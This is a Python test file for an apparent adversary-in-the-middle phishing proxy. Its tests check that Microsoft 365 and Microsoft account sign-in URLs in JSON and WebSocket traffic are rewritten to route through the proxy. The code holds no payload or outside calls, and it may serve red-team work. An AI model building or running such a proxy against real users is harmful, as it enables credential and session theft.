
import pytest
import json
from core.proxy.aitm import AiTMProxy

class TestAiTMRewrite:
    
    @pytest.fixture
    def aitm(self):
        return AiTMProxy()
        
    def test_recursive_rewrite_json(self, aitm):
        base_url = "https://login.microsoftonline.com/common/oauth2/authorize"
        proxy_base = "/v5/proxy"
        
        data = {
            "redirect_url": "https://mysignins.microsoft.com/security-info",
            "nested": {
                "next": "https://portal.office.com",
                "other": "not_a_url"
            },
            "list": [
                "https://outlook.office.com/mail",
                123
            ]
        }
        
        rewritten = aitm._recursive_rewrite(data, base_url, proxy_base)
        
        # Check rewrites
        assert "/v5/proxy" in rewritten["redirect_url"]
        assert "mysignins.microsoft.com" in rewritten["redirect_url"]
        
        assert "/v5/proxy" in rewritten["nested"]["next"]
        assert "portal.office.com" in rewritten["nested"]["next"]
        assert rewritten["nested"]["other"] == "not_a_url"
        
        assert "/v5/proxy" in rewritten["list"][0]
        assert "outlook.office.com" in rewritten["list"][0]
        assert rewritten["list"][1] == 123

    def test_rewrite_websocket_text_json(self, aitm):
        base_url = "https://login.microsoftonline.com"
        
        original_msg = json.dumps({
            "type": "redirect",
            "url": "https://account.live.com/proofs/Manage"
        })
        
        rewritten_msg = aitm._rewrite_websocket_text(original_msg, base_url)
        
        data = json.loads(rewritten_msg)
        assert "/v5/proxy" in data["url"]
        assert "account.live.com" in data["url"]

    def test_rewrite_websocket_text_raw(self, aitm):
        base_url = "https://login.microsoftonline.com"
        
        original_msg = "Please go to https://account.live.com/proofs/Manage to verify."
        
        rewritten_msg = aitm._rewrite_websocket_text(original_msg, base_url)
        
        assert "https://account.live.com/proofs/Manage" not in rewritten_msg
        assert "/v5/proxy" in rewritten_msg
        assert "account.live.com" in rewritten_msg

